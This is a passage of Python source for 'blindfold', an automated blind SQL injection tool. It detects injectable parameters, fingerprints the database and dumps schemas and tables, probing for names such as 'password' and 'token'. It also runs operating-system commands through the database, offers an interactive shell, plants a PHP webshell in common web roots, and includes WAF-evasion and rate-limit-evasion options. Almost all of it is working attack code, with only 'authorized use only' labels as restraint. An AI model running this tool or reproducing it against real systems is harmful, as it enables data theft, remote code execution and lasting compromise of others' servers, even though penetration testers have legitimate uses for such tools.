    """Use the boolean oracle to test each DBMS's unique condition."""
    for d in candidates:
        for fp in d.fingerprints:
            p = boolean_payload(ctx, fp, "-- -")
            if classifier(target.send(p)):
                return d
    return None

def find_time(target, a, contexts, candidates):
    """Try time payloads across DBMS+contexts; the one that fires reveals the DBMS."""
    for d in candidates:
        ctxs = list(contexts)
        if d.stacked:
            ctxs = ctxs + [STACKED_CONTEXT]
        for ctx in ctxs:
            if ctx.kind == "stacked" and not d.sleep_stacked(TRUE_COND, a.sleep):
                continue
            if ctx.kind != "stacked" and not d.sleep_inline(TRUE_COND, a.sleep):
                continue
            print(f"[*] time probe    : {d.name}/{ctx.name} ...", flush=True)
            o = TimeOracle(target, d, ctx, a)
            if o.confirmed():                # TRUE sleeps ~self.sleep longer than FALSE, repeated
                print(f"[+] time-based fires: {d.name}/{ctx.name}")
                return d, ctx
    return None, None

def find_error(target, a, contexts, candidates):
    """Detect a reflected DB error. Each candidate DBMS's forced-error syntax is tried;
    the one whose error reflects our PROBE both confirms error-based AND identifies the
    DBMS - so this runs even when boolean/time found no usable signal."""
    for d in candidates:
        if not d.error_expr(PROBE):          # e.g. Oracle: no error primitive
            continue
        probe_inner = f"'{PROBE}'"
        for ctx in contexts:
            if ctx.kind != "bool":
                continue
            print(f"[*] error probe   : {d.name}/{ctx.name} ...", flush=True)
            payload = f"{ctx.close}{ctx.logic}{d.error_expr(probe_inner)}{d.comment}"
            tok = d.error_value(target.send(payload).text)
            if tok and d.error_finalize(tok) == PROBE:
                print(f"[+] error reflection on {ctx.name} ({d.name})")
                return d, ctx
    return None, None


def find_union(target, a, dbms):
    """Detect a reflected UNION injection: discover column count + which column echoes.
    Each probe value is emitted as a SPLIT concatenation (e.g. 'bf'||'Uc1z'); the marker
    only appears CONTIGUOUSLY in the response if the database actually evaluated it. A
    visible-error page that merely echoes our payload shows the split form and won't match,
    so error-reflecting targets no longer false-positive as union-based."""
    prefixes = [("' AND 1=2 UNION SELECT ", "string"), ("-1 UNION SELECT ", "numeric")]
    for prefix, label in prefixes:
        for n in range(1, a.union_cols + 1):
            marks = [f"{UMARK}{i}z" for i in range(1, n + 1)]
            cols = ",".join(dbms.concat_parts((mk[:2], mk[2:])) for mk in marks)
            text = target.send(f"{prefix}{cols}{dbms.union_from}{dbms.comment}").text
            for i, mk in enumerate(marks, 1):
                if mk in text:
                    print(f"[+] UNION reflects: {label} context, {n} columns, column {i}")
                    return (prefix, n, i)
    return None


def union_read(target, det, query):
    """One-request reflected read of a scalar via the detected UNION column."""
    prefix, n, col = det.union
    cols = [det.dbms.union_wrap(query, ULEFT, URIGHT) if j == col else "NULL"
            for j in range(1, n + 1)]
    text = target.send(f"{prefix}{','.join(cols)}{det.dbms.union_from}{det.dbms.comment}").text
    m = re.search(re.escape(ULEFT) + "(.*?)" + re.escape(URIGHT), text, re.S)
    return m.group(1) if m else None


class Detection:
    def __init__(self, technique, dbms, ctx, oracle=None, classifier=None, signal="", err_ctx=None, union=None):
        self.technique, self.dbms, self.ctx = technique, dbms, ctx
        self.oracle, self.classifier, self.signal, self.err_ctx = oracle, classifier, signal, err_ctx
        self.union = union            # (prefix, n_cols, reflected_col) for union-based


def detect(target, a):
    contexts = list(BOOL_CONTEXTS)
    if not a.allow_or:
        contexts = [c for c in contexts if " OR " not in c.logic]
    candidates = [DBMS_BY_NAME[a.dbms]] if a.dbms else DBMS_LIST

    bool_ctx, cal = (None, None)
    if not (a.force_time or a.force_error):
        bool_ctx, cal = find_boolean(target, a, contexts)

    dbms = candidates[0] if a.dbms else None
    fp_inconclusive = False
    if bool_ctx and not a.dbms:
        dbms = fingerprint_dbms(target, bool_ctx, cal[0], a, candidates)
        if dbms:
            print(f"[+] DBMS fingerprint: {dbms.name}")
        else:
            # boolean signalled but DBMS unclear; an error probe can still pin it, so
            # don't bail yet - only give up later if nothing identifies the backend.
            fp_inconclusive = True

    # no boolean -> try time (also identifies DBMS)
    time_ctx = None
    if not bool_ctx and not (a.force_boolean or a.force_error):
        d2, time_ctx = find_time(target, a, contexts, candidates)
        if d2:
            dbms = d2

    # prefer UNION (reflected, ~1 request/value) when the DBMS is already known
    if dbms and not (a.force_boolean or a.force_time or a.force_error) and not a.no_union:
        u = find_union(target, a, dbms)
        if u:
            return Detection("union-based", dbms, bool_ctx or time_ctx or BOOL_CONTEXTS[0],
                             union=u)

    # error-based: one-shot AND self-identifying, so it runs even with no boolean/time
    # signal (the classic visible-error target). Probe the known DBMS, else all candidates.
    if not (a.force_boolean or a.force_time) and not a.no_error:
        ecands = [dbms] if dbms else candidates
        ed, err_ctx = find_error(target, a, contexts, ecands)
        if not ed and target.marker_prefix and not target.trim_prefix:
            target.trim_prefix = True                 # a length cap may be truncating the probe
            ed, err_ctx = find_error(target, a, contexts, ecands)
            if ed:
                target._announce_trim()
            else:
                target.trim_prefix = False
        if ed:
            return Detection("error-based", ed, err_ctx, err_ctx=err_ctx)

    if a.force_error:
        print("[!] --force-error: no reflected DB error found "
              "(try --allow-or, --dbms, or a different injection point).")
        return None

    if not dbms:
        if fp_inconclusive:
            print("[!] DBMS fingerprint inconclusive. Re-run with --dbms "
                  "<postgresql|mysql|mssql|oracle> to proceed.")
        return None

    if bool_ctx:
        oracle = BoolOracle(target, dbms, bool_ctx, a, cal[0], cal[1])
        return Detection("boolean-based", dbms, bool_ctx, oracle=oracle, classifier=cal[0], signal=cal[1])
    if time_ctx:
        return Detection("time-based", dbms, time_ctx, oracle=TimeOracle(target, dbms, time_ctx, a))
    return None


# ===========================================================================
# Extraction
# ===========================================================================
def extract_error(target, dbms, ctx, a, query=None):
    """One-shot (or chunked) dump via reflected error."""
    query = query if query is not None else a.query
    def shoot(expr):
        p = f"{ctx.close}{ctx.logic}{expr}{dbms.comment}"
        return dbms.error_value(target.send(p).text)

    def leak(inner):
        tok = shoot(dbms.error_expr(inner))               # short, direct cast (fits tight caps)
        if tok is None and target.marker_prefix and not target.trim_prefix:
            target.trim_prefix = True                     # length cap? drop the prefix and retry
            target._announce_trim()
            tok = shoot(dbms.error_expr(inner))
        if tok is None:                                   # numeric value? force a non-numeric fail
            forced = dbms.error_expr_forced(inner)
            if forced != dbms.error_expr(inner):
                tok = shoot(forced)
        return tok

    if not dbms.error_trunc:
        tok = leak(query)
        return dbms.error_finalize(tok) if tok else tok
    # chunked for DBMS that truncate error text (e.g. MySQL). Accumulate the raw
    # tokens and finalize ONCE at the end so multibyte sequences aren't split.
    raw, start, chunk = "", 1, dbms.error_trunc
    while True:
        piece = leak(f"substring(({query}),{start},{chunk})")
        if not piece:
            break
        raw += piece
        got = (len(piece) // 2) if dbms.error_hex else len(piece)
        if got < chunk:
            break
        start += chunk
        if start > a.maxlen * 16:        # generous cap for long aggregates
            break
    return dbms.error_finalize(raw)


def extract_search(oracle, a, state_path, sig, value="", length=None):
    q = a.query
    if length is None:
        length = _bin_length(oracle, q, cap=a.maxlen)
        save_state(state_path, sig, length, value, oracle.t.count)
    print(f"[+] length = {length}")

    if a.threads > 1 and oracle.kind == "boolean-based":
        print(f"[*] extracting with {a.threads} workers ...", flush=True)
        todo = list(range(len(value) + 1, length + 1))
        chars = {}

        def _resolve(p):
            # retry transient transport errors so one blip can't kill the batch
            for attempt in range(a.net_retries + 1):
                try:
                    return oracle.char_confirmed(q, p)
                except RequestError:
                    if attempt == a.net_retries:
                        raise
            return None

        next_idx = len(value) + 1               # next position to commit contiguously

        def _commit():                          # extend value by any contiguous run; checkpoint
            nonlocal value, next_idx
            grew = False
            while next_idx in chars:
                value += chars[next_idx]; next_idx += 1; grew = True
            if grew:
                save_state(state_path, sig, length, value, oracle.t.count)

        with ThreadPoolExecutor(max_workers=a.threads) as ex:
            futures = {ex.submit(_resolve, p): p for p in todo}
            try:
                for fut in as_completed(futures):
                    chars[futures[fut]] = fut.result()
                    _commit()                   # incremental checkpoint as the prefix fills
            except Exception:                   # transport *or* logic error: don't lose progress
                for f in futures:
                    f.cancel()
                _commit()                       # persist whatever contiguous prefix we have
                raise                           # re-raise: transient -> retry; bug -> surfaced
        return value

    print(f"[*] extracting: {value}", end="", flush=True)
    try:
        for pos in range(len(value) + 1, length + 1):
            value += oracle.char(q, pos)
            save_state(state_path, sig, length, value, oracle.t.count)
            sys.stdout.write(value[-1]); sys.stdout.flush()
    except KeyboardInterrupt:
        save_state(state_path, sig, length, value, oracle.t.count)
        print(f"\n\n[!] interrupted - progress saved to {state_path}; re-run to resume.")
        sys.exit(130)
    print()
    return value


# ===========================================================================
# Schema mapping  (default action) and table dump
# ===========================================================================
def _bin_length(oracle, query, cap):
    """Length of the scalar via binary search on length(query) (handles long values)."""
    lenexpr = oracle.dbms.length(query)
    hi = 1
    while hi < cap and oracle.fires(f"{lenexpr}>{hi}"):
        hi *= 2
    capped = hi >= cap
    hi = min(hi, cap)
    lo = 0
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle.fires(f"{lenexpr}>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    if lo == cap and capped and oracle.fires(f"{lenexpr}>{cap}"):
        print(f"[!] value length reached the cap ({cap}); raise --maxlen to get the rest",
              file=sys.stderr)
    return lo


def read_scalar(target, det, a, query, cap=None):
    """Extract one scalar with the detected technique (no checkpoint; for map/dump)."""
    if det.technique == "union-based":
        return union_read(target, det, query)
    if det.technique == "error-based":
        return extract_error(target, det.dbms, det.ctx, a, query)
    o = det.oracle
    n = _bin_length(o, query, cap if cap is not None else a.maxlen)
    if n == 0:
        return ""
    if a.threads > 1 and o.kind == "boolean-based":
        with ThreadPoolExecutor(max_workers=a.threads) as ex:
            chars = list(ex.map(lambda p: o.char_confirmed(query, p), range(1, n + 1)))
        return "".join(chars)
    return "".join(o.char(query, p) for p in range(1, n + 1))


def _split_list(s):
    return [x for x in re.split(r",", s or "") if x != ""]


# ---- gentle fallback enumeration (used ONLY when a schema query can't fit a length cap) ----
# Deliberately small, curated lists — not a sqlmap-sized wordlist. The point of blindfold is
# to stay quiet and surgical; this only runs when the proper query is physically too long.
COMMON_TABLES = ["users", "user", "accounts", "account", "admin", "admins", "members",
    "customers", "customer", "clients", "people", "employees", "staff", "logins",
    "credentials", "profiles", "sessions", "products", "orders", "posts", "messages",
    "settings", "tokens", "data"]
COMMON_COLUMNS = ["username", "user", "name", "login", "password", "passwd", "pass", "pwd",
    "email", "mail", "id", "role", "is_admin", "admin", "secret", "token", "hash",
    "first_name", "last_name", "created"]


def _load_wordlist(path):
    if not path:
        return []
    try:
        with open(path, encoding="utf-8", errors="ignore") as fh:
            return [ln.strip() for ln in fh if ln.strip() and not ln.lstrip().startswith("#")]
    except OSError as e:
        print(f"[!] --wordlist: {e}")
        return []


def _exists(target, det, expr):
    """One tiny request: True unless the DB said the object doesn't exist. The payload
    (' AND EXISTS(SELECT <expr>)-- -') is short, so it fits even very tight length caps."""
    ctx, dbms = det.ctx, det.dbms
    p = f"{ctx.close}{ctx.logic}EXISTS(SELECT {expr}){dbms.comment}"
    return "does not exist" not in target.send(p).text.lower()


def guess_names(target, det, a, table=None):
    """Gently probe a small set of common names by existence — the only way to enumerate when
    the proper schema query is too long for the injection point's length cap. Announced, and
    bounded to a curated list (+ optional --wordlist), to stay true to blindfold's quiet style."""
    base = COMMON_COLUMNS if table else COMMON_TABLES
    names = list(dict.fromkeys(base + _load_wordlist(getattr(a, "wordlist", None))))
    what = f"column names in '{table}'" if table else "table names"
    print(f"[*] schema query won't fit the length cap — gently probing {len(names)} common "
          f"{what} by existence ...", flush=True)
    found = []
    for n in names:
        expr = (f"{det.dbms.quote_ident(n)} FROM {det.dbms.quote_ident(table)}"
                if table else f"1 FROM {det.dbms.quote_ident(n)}")
        try:
            if _exists(target, det, expr):
                found.append(n)
                print(f"    [+] {'column' if table else 'table'} exists: {n}")
        except RequestError:
            break
    return found


def map_mode(target, det, a):
    db = read_scalar(target, det, a, det.dbms.q_current_db())
    tables = _split_list(read_scalar(target, det, a, det.dbms.q_tables()))
    probed = False
    if not tables and det.technique == "error-based":      # short query still didn't fit the cap
        tables = guess_names(target, det, a)
        probed = True
    print("\n=== DATABASE MAP ===")
    print(f"DBMS     : {det.dbms.name}")
    print(f"Database : {db}")
    print(f"Tables   : {len(tables)}" + ("  (probed common names — not exhaustive)" if probed and tables else ""))
    for t in tables:
        print(f"  - {t}")
    if not tables:
        print("[!] no tables found: the point is length-capped and no common name matched.")
        print('    target a known table directly (--dump users), or pass --wordlist FILE.')
    print(f"\n[i] dump a table with:  --dump <table>   (rows capped by --max-rows)")


def dump_mode(target, det, a):
    table = a.dump
    cols = _split_list(read_scalar(target, det, a, det.dbms.q_columns(table)))
    if not cols and det.technique == "error-based":        # column query too long for the cap
        cols = guess_names(target, det, a, table=table)
    if not cols:
        print(f"[!] no columns found for '{table}' (wrong name, or length-capped — try --wordlist)")
        return
    raw = read_scalar(target, det, a, det.dbms.q_count(table)) or "0"
    count = int(re.sub(r"[^0-9]", "", raw) or "0")
    limit = min(count, a.max_rows)
    print(f"\n=== DUMP: {table} ===")
    print(f"columns ({len(cols)}): {', '.join(cols)}")
    print(f"rows: {count}" + (f"  (showing first {limit}, raise with --max-rows)" if count > limit else ""))
    rows = []
    for i in range(limit):
        cells = (read_scalar(target, det, a, det.dbms.q_row(table, cols, i)) or "").split("|")
        rows.append((cells + [""] * len(cols))[:len(cols)])
    widths = [len(c) for c in cols]
    for r in rows:
        for j, cell in enumerate(r):
            widths[j] = max(widths[j], len(cell))
    line = lambda vals: " | ".join(v.ljust(widths[j]) for j, v in enumerate(vals))
    print("\n" + line(cols))
    print("-+-".join("-" * w for w in widths))
    for r in rows:
        print(line(r))


# ===========================================================================
# RCE - OS command execution / webshell (authorized testing only)
# ===========================================================================
def _rce_send(target, det, stmts):
    """Fire stacked statements through the injection point (no oracle / output)."""
    ctx = det.ctx
    prefix = "1" if ctx.close == "" else ""      # numeric param needs a value before ';'
    body = ";".join(stmts)
    target.send(f"{prefix}{ctx.close};{body}{det.dbms.comment}")


WEBROOTS = [                          # common Linux web roots, tried when --os-path is omitted
    "/var/www/html", "/var/www", "/usr/share/nginx/html", "/usr/local/apache2/htdocs",
    "/srv/http", "/var/www/localhost/htdocs", "/app/static", "/home/site/wwwroot",
]
SHELL_EXTS = (".php", ".phtml", ".jsp", ".jspx", ".asp", ".aspx")


def rce_mode(target, det, a):
    """Direct OS command execution (PostgreSQL COPY FROM PROGRAM / MSSQL xp_cmdshell)."""
    dbms = det.dbms
    if not dbms.can_exec:
        hint = " - try --webshell instead" if dbms.can_webshell else ""
        print(f"[!] direct command exec is not supported for {dbms.name}{hint}")
        return
    if not dbms.stacked:
        print(f"[!] command exec needs stacked queries, unavailable for {dbms.name}")
        return

    print(f"[*] enabling command execution on {dbms.name} (needs high privileges) ...", flush=True)
    if dbms.rce_setup():
        _rce_send(target, det, dbms.rce_setup())

    def run_one(cmd):
        _rce_send(target, det, dbms.rce_exec(cmd))
        out = read_scalar(target, det, a, dbms.rce_read())
        return out if out is not None else ""

    try:
        if a.rce == RCE_SHELL:
            print("[*] interactive pseudo-shell - type a command, 'exit' to quit\n")
            while True:
                try:
                    cmd = input("rce$ ").strip()
                except EOFError:
                    break
                if cmd in ("exit", "quit"):
                    break
                if cmd:
                    print(run_one(cmd))
        else:
            print(run_one(a.rce))
    finally:
        if dbms.rce_cleanup():
            _rce_send(target, det, dbms.rce_cleanup())


def _shell_targets(a, dbms):
    """Build the list of candidate file paths to try for the webshell."""
    name = a.shell_name
    def as_file(p):
        return p if p.lower().endswith(SHELL_EXTS) else p.rstrip("/") + "/" + name
    if a.os_path:
        return [as_file(a.os_path)]
    cands = [as_file(r) for r in WEBROOTS]
    if dbms.name == "mysql":            # DUMPFILE relative paths resolve from the datadir;
        for k in range(2, 9):           # climb out with ../ and into the web root
            cands.append("../" * k + "var/www/html/" + name)
    return cands


def webshell_mode(target, det, a):
    """Drop a webshell file, verify the write through the oracle, and report the path."""
    dbms = det.dbms
    if not dbms.can_webshell:
        hint = " - try --rce for command exec" if dbms.can_exec else ""
        print(f"[!] webshell write is not supported for {dbms.name}{hint}")
        return

    marker = "BF_" + hashlib.sha1(str(time.time()).encode()).hexdigest()[:8]
    content = a.shell_payload or f"<?php /*{marker}*/ system($_GET['c']); ?>"
    if marker not in content:           # custom payload: still embed a marker comment to verify
        content = f"<?php /*{marker}*/ ?>" + content
    write_stackable = dbms.stacked      # PG can stack the write; MySQL usually cannot

    targets = _shell_targets(a, dbms)
    print(f"[*] attempting webshell drop on {dbms.name} ({len(targets)} candidate path(s)) ...", flush=True)
    for path in targets:
        if write_stackable:
            _rce_send(target, det, [dbms.webshell_write(path, content)])
        else:
            target.send(dbms.webshell_write(path, content))   # standalone SELECT ... INTO DUMPFILE
        chk = read_scalar(target, det, a, dbms.file_check(path, marker)) or ""
        if "OK" in chk:
            print(f"[+] webshell written and VERIFIED -> {path}")
            print(f"    trigger it: curl 'http://<target>/<web-path>/{os.path.basename(path)}?c=id'")
            return
    print("[!] could not confirm any write (needs file-write priv + permissive policy).")
    print("    pick a known web root with --os-path, or deliver this payload via your own vector:")
    print(f"    {dbms.webshell_write(a.os_path or '/var/www/html/' + a.shell_name, content)}")


# ---------------------------- resume / checkpoint ----------------------------
def job_signature(a, det, target):
    raw = "|".join([target.method, target.url or "", target.data or "",
                    det.technique, det.dbms.name, det.ctx.name, a.query or "",
                    str(a.sleep)])
    return hashlib.sha1(raw.encode()).hexdigest()[:10]

def load_state(path, sig):
    try:
        with open(path) as fh:
            d = json.load(fh)
        if d.get("sig") == sig:
            return d
    except Exception:
        pass
    return None

def save_state(path, sig, length, value, count):
    tmp = path + ".tmp"
    with open(tmp, "w") as f:
        json.dump({"sig": sig, "length": length, "value": value, "count": count}, f)
    os.replace(tmp, path)


def diagnose(target, a):
    """Detection failed. Compare a clean baseline against a representative injected
    request so the failure mode is obvious instead of opaque: is the request itself
    being rejected (wrong scheme/host/session), is only the *payload* rejected
    (WAF / encoding), or is the response simply not changing?"""
    print("\n[*] diagnostic: clean baseline vs an injected request ...")
    try:
        base = target.send("")
        ctx = BOOL_CONTEXTS[0]                        # string-and: '...' AND (1=1)-- -
        inj = target.send(boolean_payload(ctx, TRUE_COND, "-- -"))
    except RequestError as e:
        print(f"    [!] request transport failed: {e}")
        return
    print(f"    baseline : status={base.status} len={base.length}")
    print(f"    injected : status={inj.status} len={inj.length}  ({ctx.name})")
    if base.status < 400 <= inj.status:
        print("    -> the INJECTED request is rejected (4xx/5xx) but the baseline is OK:")
        print("       the payload isn't accepted. Try --no-encode and/or --tamper "
              "space2comment,randomcase, or confirm the sink isn't URL-decoded.")
    elif base.status >= 400:
        print("    -> the BASE request is rejected even without injection:")
        print("       check scheme (http vs https), Host, the session cookie, or marker placement.")
    elif base.status == inj.status and base.length == inj.length:
        print("    -> baseline and injected responses are identical:")
        print("       the payload likely isn't landing (marker not in the query sink, or a "
              "static page). Confirm the injection point and --marker.")
    else:
        print("    -> responses differ but no stable discriminator was found:")
        print("       re-run with -v, or pin it with --true-match/--false-match.")


def main():
    ap = argparse.ArgumentParser(
        description="blindfold - auto-detecting blind SQLi extractor (DBMS + error/boolean/time)")
    src = ap.add_argument_group("target (use -u/-d/-H  OR  --request)")
    src.add_argument("-u", "--url"); src.add_argument("-d", "--data")
    src.add_argument("-H", "--header", action="append")
    src.add_argument("-X", "--method"); src.add_argument("--request")
    src.add_argument("--proto", help="force scheme for --request (default: auto-probe https, then http)")

    act = ap.add_argument_group("action (default: map the database)")
    act.add_argument("--query", help="extract a single SQL scalar (power mode)")
    act.add_argument("--dump", metavar="TABLE", help="dump rows of TABLE (columns auto-discovered)")
    act.add_argument("--max-rows", type=int, default=50, dest="max_rows", help="row cap for --dump (default 50)")
    act.add_argument("--wordlist", metavar="FILE",
                     help="extra candidate names for gentle table/column probing on capped points")
    act.add_argument("--rce", nargs="?", const=RCE_SHELL, metavar="CMD",
                     help="OS command via the DBMS (no CMD = interactive shell). Authorized use only")
    act.add_argument("--webshell", action="store_true",
                     help="drop a webshell file, verify it, and report the path. Authorized use only")

    rg = ap.add_argument_group("rce / webshell options")
    rg.add_argument("--os-path", dest="os_path",
                    help="target file path or web-root dir for --webshell (else common roots are tried)")
    rg.add_argument("--shell-name", dest="shell_name", default="bf.php", help="webshell filename")
    rg.add_argument("--shell-payload", dest="shell_payload", help="custom webshell content")

    inj = ap.add_argument_group("injection")
    inj.add_argument("--marker", default="INJECT")
    inj.add_argument("--no-encode", dest="encode", action="store_false")

    det = ap.add_argument_group("detection")
    det.add_argument("--dbms", choices=list(DBMS_BY_NAME), help="pin the DBMS (skip fingerprinting)")
    det.add_argument("--force-boolean", action="store_true")
    det.add_argument("--force-time", action="store_true")
    det.add_argument("--force-error", action="store_true",
                     help="only use error-based; skip boolean/time probing")
    det.add_argument("--no-error", action="store_true", help="don't use error-based even if available")
    det.add_argument("--no-union", action="store_true", help="don't try UNION (reflected) extraction")
    det.add_argument("--union-cols", type=int, default=12, dest="union_cols",
                     help="max columns to probe for UNION (default 12)")
    det.add_argument("--tamper", help="WAF evasion, comma-separated: space2comment, randomcase, charencode")
    det.add_argument("--allow-or", action="store_true", help="include risky OR contexts (may change app state)")
    det.add_argument("--true-match", help="string only in a TRUE response (overrides calibration)")
    det.add_argument("--false-match", help="string only in a FALSE response")
    det.add_argument("--len-margin", type=int, default=12)

    tun = ap.add_argument_group("tuning")
    tun.add_argument("--sleep", type=float, default=3.0)
    tun.add_argument("--threshold", type=float, default=0.0, help="absolute time threshold (default: adaptive from baseline)")
    tun.add_argument("--cal-samples", type=int, default=5, dest="cal_samples", help="baseline latency samples for adaptive timing")
    tun.add_argument("--max-codepoint", type=int, default=0x10FFFF, dest="max_codepoint", help="upper bound for Unicode extraction")
    tun.add_argument("--retries", type=int, default=1)
    tun.add_argument("--net-retries", type=int, default=2, dest="net_retries",
                     help="transport-level retries on connection errors (with backoff)")
    tun.add_argument("--threads", type=int, default=1, help="parallel workers for boolean extraction")
    tun.add_argument("--maxlen", type=int, default=4096, help="max value length / length-probe cap")
    tun.add_argument("--charset", help="restrict extraction to a known alphabet for speed: "
                     "a preset (hex, HEX, digits, alnum) or a literal set of characters")
    tun.add_argument("--timeout", type=float, default=30.0,
                     help="HTTP timeout seconds (auto-raised above --sleep for time-based)")
    tun.add_argument("--ascii", dest="ascii_only", action="store_true",
                     help="ASCII-only target: skip the Unicode probe (1 fewer request/char)")
    tun.add_argument("--proxy")
    tun.add_argument("--insecure", action="store_true", help="skip TLS verification (and silence its warning)")
    tun.add_argument("-v", "--verbose", action="store_true", help="show detection internals (probe status/length, discriminator)")
    tun.add_argument("--delay", type=float, default=0.0, help="seconds to wait before each request (evade rate limits / 504)")
    tun.add_argument("--jitter", type=float, default=0.0, help="add random 0..N seconds on top of --delay")

    res = ap.add_argument_group("resume")
    res.add_argument("--state"); res.add_argument("--fresh", action="store_true")

    ap.set_defaults(encode=True)
    a = ap.parse_args()
    if not a.request and not a.url:
        ap.error("provide -u/--url (with -d/-H) or --request")
    if sum((a.force_boolean, a.force_time, a.force_error)) > 1:
        ap.error("--force-boolean / --force-time / --force-error are mutually exclusive")
    actions = sum(x for x in (a.query is not None, a.dump is not None, a.rce is not None, a.webshell))
    if actions > 1:
        ap.error("choose only one of --query / --dump / --rce / --webshell")
    if a.tamper:
        bad = [t.strip() for t in a.tamper.split(",") if t.strip() and t.strip() not in ALL_TAMPERS]
        if bad:
            ap.error(f"unknown --tamper: {', '.join(bad)} (available: {', '.join(sorted(ALL_TAMPERS))})")
    if a.charset:                       # resolve preset/custom -> sorted unique alphabet
        presets = {"hex": "0123456789abcdef", "HEX": "0123456789ABCDEF",
                   "digits": "0123456789",
                   "alnum": "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"}
        a.charset = "".join(sorted(set(presets.get(a.charset, a.charset))))

    target = Target(a)

    print(BANNER)
    target.autodetect_scheme()
    print("=== PHASE 1: detection ===")
    det = detect(target, a)
    if not det:
        print("\n[!] no blind injection detected.")
        diagnose(target, a)
        print("    try --allow-or, --dbms, --force-time, --true-match, or check marker placement.")
        sys.exit(1)
    print(f"\n[+] DBMS      : {det.dbms.name}")
    print(f"[+] TECHNIQUE : {det.technique}")
    print(f"[+] CONTEXT   : {det.ctx.name}" + (f"  signal={det.signal}" if det.signal else ""))
    print(f"[*] detection cost: {target.count} requests")

    # ---- action dispatch ----
    if a.rce is not None:
        rce_mode(target, det, a)
        print(f"\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
        return
    if a.webshell:
        webshell_mode(target, det, a)
        print(f"\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
        return
    if a.dump:
        dump_mode(target, det, a)
        print(f"\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
        return
    if not a.query:
        map_mode(target, det, a)
        print(f"\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
        return

    # ---- --query : single scalar ----
    print("\n=== EXTRACTION ===")
    print(f"[*] query : {a.query}")

    if det.technique in ("union-based", "error-based"):
        val = union_read(target, det, a.query) if det.technique == "union-based" \
            else extract_error(target, det.dbms, det.ctx, a)
        if not val:
            print(f"[!] {det.technique} returned nothing.")
            if det.technique == "error-based":
                print("    the value may be empty, or the point is length-capped and the query is "
                      "too long — shorten it (one short column + LIMIT 1) or drop a fixed cookie "
                      "prefix (use TrackingId=INJECT).")
            else:
                print("    try --no-union/--no-error to fall back, or --force-error.")
            sys.exit(1)
        print(f"\n[+] RESULT: {val}\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
        return

    sig = job_signature(a, det, target)
    state_path = a.state or f".blindfold-{sig}.json"
    print(f"[*] state : {state_path}")
    value, length = "", None
    if not a.fresh:
        st = load_state(state_path, sig)
        if st:
            length, value = st.get("length"), st.get("value", "")
            print(f"[*] resuming: {len(value)}/{length} -> '{value}'")
    val = extract_search(det.oracle, a, state_path, sig, value, length)
    if val is None:
        print("[!] length not found (empty result or bad query)")
        sys.exit(1)
    print(f"\n[+] RESULT: {val}\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
    try:
        os.remove(state_path)
    except OSError:
        pass


if __name__ == "__main__":
    try:
        main()
    except RequestError as e:
        print(f"\n[!] {e}", file=sys.stderr)
        sys.exit(2)
    except KeyboardInterrupt:
        print("\n[!] interrupted", file=sys.stderr)
        sys.exit(130)
